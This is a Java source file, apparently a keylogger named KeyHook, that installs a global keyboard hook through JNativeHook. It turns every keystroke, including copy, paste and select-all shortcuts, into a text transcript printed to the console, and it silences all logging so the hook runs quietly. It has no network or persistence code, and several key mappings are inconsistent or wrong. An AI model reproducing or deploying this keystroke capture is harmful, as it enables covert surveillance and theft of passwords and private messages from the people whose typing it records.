package com.Nimex.KeyHook;

import java.util.HashSet;
import java.util.Set;
import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.*;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class JNativeHook implements NativeKeyListener 
{
	Capslock setGet = new Capslock();
	
	//
	static Set<Integer> AlphabetSet = new HashSet<Integer>();
	static Set<Integer> NumbericSet = new HashSet<Integer>();
	static Set<Integer> SpecialCharSet = new HashSet<Integer>();
	static Set<Integer> NumPadSet = new HashSet<Integer>();
	//
	
	
	// NoClassDef is because jnativehook exists in temp folder. please delete it and retry
	public static void main(String[] args) 
	{	
		// Set all key values
		SetAlphabetValues();
		SetNumericValues();
		SetSpecialCharacters();
		SetNumPadCharacters();
		
		try
		{
			GlobalScreen.registerNativeHook();
		}
		catch (Throwable er) {}
		try
		{
		    GlobalScreen.addNativeKeyListener(new JNativeHook());
			Handler[] handlers = Logger.getLogger("").getHandlers();
			for (int i = 0; i < handlers.length; i++) 
			{
			    handlers[i].setLevel(Level.OFF);
			}
			Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
			logger.setLevel(Level.OFF);
		}
		catch (Exception er) {}
	}

	static void SetAlphabetValues()
	{
		// A-Z + CAPS LOCK
		AlphabetSet.add(30); // A
		AlphabetSet.add(48);
		AlphabetSet.add(46);
		AlphabetSet.add(32);
		AlphabetSet.add(18);
		AlphabetSet.add(33);
		AlphabetSet.add(34);
		AlphabetSet.add(35);	
		AlphabetSet.add(23);
		AlphabetSet.add(36);
		AlphabetSet.add(37);
		AlphabetSet.add(38);
		AlphabetSet.add(50);	
		AlphabetSet.add(49);
		AlphabetSet.add(24);
		AlphabetSet.add(19);
		AlphabetSet.add(25);
		AlphabetSet.add(16);
		AlphabetSet.add(31);
		AlphabetSet.add(20);
		AlphabetSet.add(22);
		AlphabetSet.add(47);
		AlphabetSet.add(45);
		AlphabetSet.add(17);
		AlphabetSet.add(21);
		AlphabetSet.add(44); // Z
		AlphabetSet.add(58); // Caps
	}
	static void SetNumericValues()
	{
		for (int i = 2; i < 12; i++)
		{
			NumbericSet.add(i);
		}
	}
    static void SetSpecialCharacters()
    {
    	SpecialCharSet.add(43);
    	SpecialCharSet.add(1); 	
    	SpecialCharSet.add(57);
    	SpecialCharSet.add(14);	
    	SpecialCharSet.add(42);
    	SpecialCharSet.add(54);	
    	SpecialCharSet.add(29);
    	SpecialCharSet.add(3613); 	
    	SpecialCharSet.add(28);
    	SpecialCharSet.add(3675);   	
    	SpecialCharSet.add(56);  	
    	SpecialCharSet.add(51);
    	SpecialCharSet.add(52);
    	SpecialCharSet.add(12);	
    	SpecialCharSet.add(53);
    	SpecialCharSet.add(39);
    	SpecialCharSet.add(26);   	
    	SpecialCharSet.add(13);
    	SpecialCharSet.add(27);	
    	SpecialCharSet.add(40); 
    	SpecialCharSet.add(41);  
    	
    	SpecialCharSet.add(3639); 
    	SpecialCharSet.add(70); 
    	SpecialCharSet.add(3653); 
    	SpecialCharSet.add(3666);
    	SpecialCharSet.add(3663); 
    	SpecialCharSet.add(3665); 
    	SpecialCharSet.add(3657);
    	SpecialCharSet.add(3655);
    	SpecialCharSet.add(57377); 
    	SpecialCharSet.add(3667); 
    }
    static void SetNumPadCharacters()
    {
    	NumPadSet.add(82); // 0
    	NumPadSet.add(79); // 1 
    	NumPadSet.add(80); // 2
    	NumPadSet.add(81); // 3
    	NumPadSet.add(75); // 4
    	NumPadSet.add(76); // 5
    	NumPadSet.add(77); // 6
    	NumPadSet.add(71); // 7
    	NumPadSet.add(72); // 8
    	NumPadSet.add(73); // 9
    	NumPadSet.add(83); // ,
    	NumPadSet.add(28); // [ENTER]
    	NumPadSet.add(78); // +
    	NumPadSet.add(74); // -
    	NumPadSet.add(55); // * 
    	NumPadSet.add(3637); // /
    	NumPadSet.add(69); // Caps lock
    }
    static void setPlayKeys()
    {
    	
    }
    static Boolean ShiftCtrlAltPlusKeys(NativeKeyEvent e)
	{		
		boolean isShiftPressed = (e.getModifiers() & NativeKeyEvent.SHIFT_MASK) > 0;
		boolean isCtrlPressed = (e.getModifiers() & NativeKeyEvent.CTRL_MASK) > 0;
		
		if (e.getKeyCode() == 46 && isCtrlPressed)
		{
			System.out.print("[COPY - CTRL+C]");
			return true;
		}
		if (e.getKeyCode() == 30 && isCtrlPressed)
		{
			System.out.print("[SELECT_ALL - CTRL+A]");
			return true;
		}	
		if (e.getKeyCode() == 47 && isCtrlPressed)
		{
			System.out.print("[PASTE - CTRL+V]");
			return true;
		}
		if (e.getKeyCode() == 33 && isCtrlPressed)
		{
			System.out.print("[FIND - CTRL+F]");
			return true;
		}
		if (e.getKeyCode() == 17 && isCtrlPressed)
		{
			System.out.print("[CUT - CTRL+X]");
			return true;
		}	
		if (e.getKeyCode() == 2 && isShiftPressed)
		{
			System.out.print("!");
			return true;
		}
		else if (e.getKeyCode() == 3 && isShiftPressed)
		{
			char quote = '@';
			System.out.print(quote);
			return true;
		}			
		else if (e.getKeyCode() == 4 && isShiftPressed)
		{
			System.out.print("#");
			return true;
		}
		else if (e.getKeyCode() == 5 && isShiftPressed)
		{
			System.out.print("$");
			return true;
		}
		else if (e.getKeyCode() == 6 && isShiftPressed)
		{
			System.out.print("%");
			return true;
		}
		else if (e.getKeyCode() == 7 && isShiftPressed)
		{
			System.out.print("^");
			return true;
		}
		else if (e.getKeyCode() == 8 && isShiftPressed)
		{
			System.out.print("&");
			return true;
		}
		else if (e.getKeyCode() == 9 && isShiftPressed)
		{
			System.out.print("*");
			return true;
		}
		else if (e.getKeyCode() == 10 && isShiftPressed)
		{
			System.out.print("(");
			return true;
		}
		else if (e.getKeyCode() == 11 && isShiftPressed)
		{
			System.out.print(")");
			return true;
		}
		else if (e.getKeyCode() == 43 && isShiftPressed)
		{
			System.out.print("|");
			return true;
		}
		else if (e.getKeyCode() == 12 && isShiftPressed)
		{
			System.out.print("_");
			return true;
		}
		else if (e.getKeyCode() == 13 && isShiftPressed)
		{
			System.out.print("+");
			return true;
		}
		else if (e.getKeyCode() == 40 && isShiftPressed)
		{
			char quote = '"';
			System.out.print(quote);
			return true;
		}
		else if (e.getKeyCode() == 39 && isShiftPressed)
		{
			System.out.print(":");
			return true;
		}
		else if (e.getKeyCode() == 51 && isShiftPressed)
		{
			System.out.print("<");
			return true;
		}
		else if (e.getKeyCode() == 52 && isShiftPressed)
		{
			System.out.print(">");
			return true;
		}
		else if (e.getKeyCode() == 53 && isShiftPressed)
		{
			System.out.print("?");
			return true;
		}
		else if (e.getKeyCode() == 53 && isShiftPressed)
		{
			System.out.print("?");
			return true;
		}
		else if (e.getKeyCode() == 26 && isShiftPressed)
		{
			System.out.print("{");
			return true;
		}
		else if (e.getKeyCode() == 27 && isShiftPressed)
		{
			System.out.print("}");
			return true;
		}	
		else if (e.getKeyCode() == 41 && isShiftPressed)
		{
			System.out.print("~");
			return true;
		}	
		
		// Alphabet
		else if (e.getKeyCode() == 30 & isShiftPressed)
		{
			System.out.print("A");
			return true;
		}	
		else if (e.getKeyCode() == 48 & isShiftPressed)
		{
			System.out.print("B");
			return true;
		}
		else if (e.getKeyCode() == 46 & isShiftPressed)
		{
			System.out.print("C");
			return true;
		}
		else if (e.getKeyCode() == 32 & isShiftPressed)
		{
			System.out.print("D");
			return true;
		}
		else if (e.getKeyCode() == 18 & isShiftPressed)
		{
			System.out.print("E");
			return true;
		}
		else if (e.getKeyCode() == 33 & isShiftPressed)
		{
			System.out.print("F");
			return true;
		}	
		else if (e.getKeyCode() == 34 & isShiftPressed)
		{
			System.out.print("G");
			return true;
		}
		else if (e.getKeyCode() == 35 & isShiftPressed)
		{
			System.out.print("H");
			return true;
		}
		else if (e.getKeyCode() == 23 & isShiftPressed)
		{
			System.out.print("I");
			return true;
		}
		else if (e.getKeyCode() == 36 & isShiftPressed)
		{
			System.out.print("J");
			return true;
		}
		else if (e.getKeyCode() == 37 & isShiftPressed)
		{
			System.out.print("K");
			return true;
		}
		else if (e.getKeyCode() == 38 & isShiftPressed)
		{
			System.out.print("L");
			return true;
		}
		else if (e.getKeyCode() == 50 & isShiftPressed)
		{
			System.out.print("M");
			return true;
		}
		else if (e.getKeyCode() == 49 & isShiftPressed)
		{
			System.out.print("N");
			return true;
		}
		else if (e.getKeyCode() == 24 & isShiftPressed)
		{
			System.out.print("O");
			return true;
		}
		else if (e.getKeyCode() == 19 & isShiftPressed)
		{
			System.out.print("P");
			return true;
		}
		else if (e.getKeyCode() == 25 & isShiftPressed)
		{
			System.out.print("Q");
			return true;
		}
		else if (e.getKeyCode() == 16 & isShiftPressed)
		{
			System.out.print("R");
			return true;
		}
		else if (e.getKeyCode() == 31 & isShiftPressed)
		{
			System.out.print("S");
			return true;
		}
		else if (e.getKeyCode() == 20 & isShiftPressed)
		{
			System.out.print("T");
			return true;
		}
		else if (e.getKeyCode() == 22 & isShiftPressed)
		{
			System.out.print("U");
			return true;
		}
		else if (e.getKeyCode() == 47 & isShiftPressed)
		{
			System.out.print("V");
			return true;
		}
		else if (e.getKeyCode() == 45 & isShiftPressed)
		{
			System.out.print("W");
			return true;
		}
		else if (e.getKeyCode() == 17 & isShiftPressed)
		{
			System.out.print("X");
			return true;
		}
		else if (e.getKeyCode() == 21 & isShiftPressed)
		{
			System.out.print("Y");
			return true;
		}
		else if (e.getKeyCode() == 44 & isShiftPressed)
		{
			System.out.print("Z");
			return true;
		}
		//
		else
		{
			return false;
		}
	}
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) 
	{		
		try
		{
			int i = e.getKeyCode();	
							
			if (ShiftCtrlAltPlusKeys(e)) // Working
			{
				return;
			}
			
			if (AlphabetSet.contains(i)) // Working
			{
				Alphabet(i);
			}
				
			if (NumbericSet.contains(i)) // Working
			{
				Numbers(i);
			}
			
			if (i >= 59 && i <= 68 || i >= 99 && i <= 107 || i == 92 || i == 93 || i == 91 ||
					i == 87 || i == 88) // Working
			{
				FKeys(i);
			}
			
			if (SpecialCharSet.contains(i))
			{
				SpecialKeys(i);
			}		
			
			if (NumPadSet.contains(i))
			{
				NumPadKeys(i);
			}
		
			System.out.print(e.getKeyCode() + " ");
			System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));
		}
		catch (Exception er)
		{
			System.out.println(er.toString());
		}
	}
	
	static void Numbers(int i)
	{	
		switch (i)
		{
		case 2:
			System.out.print("1");
			break;
		case 3:
			System.out.print("2");
			break;
		case 4:
			System.out.print("3");
			break;
		case 5:
			System.out.print("4");
			break;
		case 6:
			System.out.print("5");
			break;
		case 7:
			System.out.print("6");
			break;
		case 8:
			System.out.print("7");
			break;
		case 9:
			System.out.print("8");
			break;
		case 10:
			System.out.print("9");
			break;
		case 11:
			System.out.print("0");
			break;
		}				
	}
	static void Alphabet(int i)
	{		
		if (i == 58)
		{
			if (Capslock.getStatus())
			{
				Capslock.setStatus(false);
				System.out.print("[CAPSLOCK]");
			}
			else
			{
				Capslock.setStatus(true);
				System.out.print("[CAPSLOCK]");
			}
		}
		else
		{
			if (Capslock.getStatus())
			{
				switch (i)
				{
				case 30:
					System.out.print("A");
					break;
				case 48:
					System.out.print("B");
					break;
				case 46:
					System.out.print("C");
					break;
				case 32:
					System.out.print("D");
					break;
				case 18:
					System.out.print("E");
					break;
				case 33:
					System.out.print("F");
					break;
				case 34:
					System.out.print("G");
					break;
				case 35:
					System.out.print("H");
					break;
				case 23:
					System.out.print("I");
					break;
				case 36:
					System.out.print("J");
					break;
				case 37:
					System.out.print("K");
					break;
				case 38:
					System.out.print("L");
					break;
				case 50:
					System.out.print("M");
					break;
				case 49:
					System.out.print("N");
					break;
				case 24:
					System.out.print("O");
					break;
				case 25:
					System.out.print("P");
					break;
				case 16:
					System.out.print("Q");
					break;
				case 19:
					System.out.print("R");
					break;
				case 31:
					System.out.print("S");
					break;
				case 20:
					System.out.print("T");
					break;
				case 22:
					System.out.print("U");
					break;
				case 47:
					System.out.print("V");
					break;		
				case 17:
					System.out.print("W");
					break;
				case 45:
					System.out.print("X");
					break;
				case 21:
					System.out.print("Y");
					break;
				case 44:
					System.out.print("Z");
					break;
				}
			}
			else
			{
				switch (i)
				{
				case 30:
					System.out.print("a");
					break;
				case 48:
					System.out.print("b");
					break;
				case 46:
					System.out.print("c");
					break;
				case 32:
					System.out.print("d");
					break;
				case 18:
					System.out.print("e");
					break;
				case 33:
					System.out.print("f");
					break;
				case 34:
					System.out.print("g");
					break;
				case 35:
					System.out.print("h");
					break;
				case 23:
					System.out.print("i");
					break;
				case 36:
					System.out.print("j");
					break;
				case 37:
					System.out.print("k");
					break;
				case 38:
					System.out.print("l");
					break;
				case 50:
					System.out.print("m");
					break;
				case 49:
					System.out.print("n");
					break;
				case 24:
					System.out.print("o");
					break;
				case 25:
					System.out.print("p");
					break;
				case 16:
					System.out.print("q");
					break;
				case 19:
					System.out.print("r");
					break;
				case 31:
					System.out.print("s");
					break;
				case 20:
					System.out.print("t");
					break;
				case 22:
					System.out.print("u");
					break;
				case 47:
					System.out.print("v");
					break;		
				case 17:
					System.out.print("w");
					break;
				case 45:
					System.out.print("x");
					break;
				case 21:
					System.out.print("y");
					break;
				case 44:
					System.out.print("z");
					break;
				case 40:
					char quote = 60;
					System.out.print(quote);
					break;
					
				}
			}
		}
	}
	static void FKeys(int i)
	{
		switch (i)
		{
		case 59:
			System.out.print("[F1]");
			break;
		case 60:
			System.out.print("[F2]");
			break;
		case 61:
			System.out.print("[F3]");
			break;
		case 62:
			System.out.print("[F4]");
			break;
		case 63:
			System.out.print("[F5]");
			break;
		case 64:
			System.out.print("[F6]");
			break;
		case 65:
			System.out.print("[F7]");
			break;
		case 66:
			System.out.print("[F8]");
			break;
		case 67:
			System.out.print("[F9]");
			break;
		case 68:
			System.out.print("[F10]");
			break;
		case 87:
			System.out.print("[F11]");
			break;
		case 88:
			System.out.print("[F12]");
			break;
		case 91:
			System.out.print("[F13]");
			break;
		case 92:
			System.out.print("[F14]");
			break;
		case 93:
			System.out.print("[F15]");
			break;
		case 99:
			System.out.print("[F16]");
			break;
		case 100:
			System.out.print("[F17]");
			break;
		case 101:
			System.out.print("[F18]");
			break;
		case 102:
			System.out.print("[F19]");
			break;
		case 103:
			System.out.print("[F20]");
			break;
		case 104:
			System.out.print("[F21]");
			break;
		case 105:
			System.out.print("[F22]");
			break;
		case 106:
			System.out.print("[F23]");
			break;
		case 107:
			System.out.print("[F24]");
			break;
		}
	}
	static void SpecialKeys(int i)
	{
		switch (i)
		{
		case 28:
			System.out.print("\n"); // [ENTER]
			break;
		case 14:
			System.out.print("[BACKSPACE]");
			break;
		case 43:
			char quote = 92;
			System.out.print(quote); 
			break;
		case 42:
			System.out.print("[SHIFT]");
			break;
		case 54:
			System.out.print("[SHIFT]");
			break;			
		case 56:
			System.out.print("[ALTKEY]");
			break;		
		case 1:
			System.out.print("[ESC]");
			break;
		case 29:
			System.out.print("[CONTROL_LEFT]");
			break;
		case 3613:
			System.out.print("[CONTROL_RIGHT]");
			break;
		case 57:
			System.out.print(" ");
			break;	
		case 3675:
			System.out.print("[WINDOWSKEY]");
			break;
		case 51:
			System.out.print(",");
			break;
		case 52:
			System.out.print(".");
			break;
		case 40:
			System.out.print("'");
			break;
		case 12:
			System.out.print("-");
			break;
		case 27:
			System.out.print("]");
			break;
		case 53:
			System.out.print("/");
			break;
		case 39:
			System.out.print(";");
			break;
		case 26:
			System.out.print("[");
			break;
		case 13:
			System.out.print("=");
			break;
		case 41:
			System.out.print("`");
			break;
		case 3639:
			System.out.print("[PRINTSCREEN]");
			break;
		case 70:
			System.out.print("[SCROLL_LOCK]");
			break;
		case 3653:
			System.out.print("[PAUSE]");
			break;
		case 3666:
			System.out.print("[INSERT]");
			break;
		case 3663:
			System.out.print("[END]");
			break;
		case 3665:
			System.out.print("[PAGE_DOWN]");
			break;
		case 3657:
			System.out.print("[PAGE_UP]");
			break;
		case 3655:
			System.out.print("[HOME]");
			break;
		case 57377:
			System.out.print("[CALCULATOR");
    		break;
		case 3667:
			System.out.print("[DELETE]");
			break;
		}
	}
	static void Playkeys(int i)
	{
		switch (i)
		{
		case 57416:
			System.out.print("[UP]");
			break;
		case 57421:
			System.out.print("[RIGHT]");
			break;
		case 57424:
			System.out.print("[DOWN]");
			break;
		case 57419:
			System.out.print("[LEFT]");
			break;
		}
	}
	static void NumPadKeys(int i)
	{
		switch (i)
		{
		case 82:
			System.out.print("[NUMPAD 0]");
			break;
		case 79:
			System.out.print("[NUMPAD 1]");
			break;
		case 80:
			System.out.print("[NUMPAD 2]");
			break;
		case 81:
			System.out.print("[NUMPAD 3]");
			break;
		case 75:
			System.out.print("[NUMPAD 4]");
			break;
		case 76:
			System.out.print("[NUMPAD 5]");
			break;
		case 77:
			System.out.print("[NUMPAD 6]");
			break;
		case 71:
			System.out.print("[NUMPAD 7]");
			break;
		case 72:
			System.out.print("[NUMPAD 8]");
			break;
		case 73:
			System.out.print("[NUMPAD 9]");
			break;
		case 55:
			System.out.print("[MULTIPLY]");
			break;
		case 78:
			System.out.print("[ADD]");
			break;
		case 74:
			System.out.print("[SUBSTRACT]");
			break;
		case 83:
			System.out.print("[COMMA]");
			break;
		case 3637:
			System.out.print("[DIVIDE]");
			break;
		
			// Overall Keys
		case 28:
			System.out.print("[ENTER]");
			break;
		case 69:
			System.out.print("[NUMLOCK]");
			break;
		}
	}
	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {}
	public void nativeKeyTyped(NativeKeyEvent arg0) {}
    static class Capslock
	{
		static boolean CapslockStatus = false;
		static boolean getStatus()
	    {
	        return CapslockStatus;
	    }
		static void setStatus(boolean status)
	    {
			CapslockStatus = status;           
	    }

	}
}
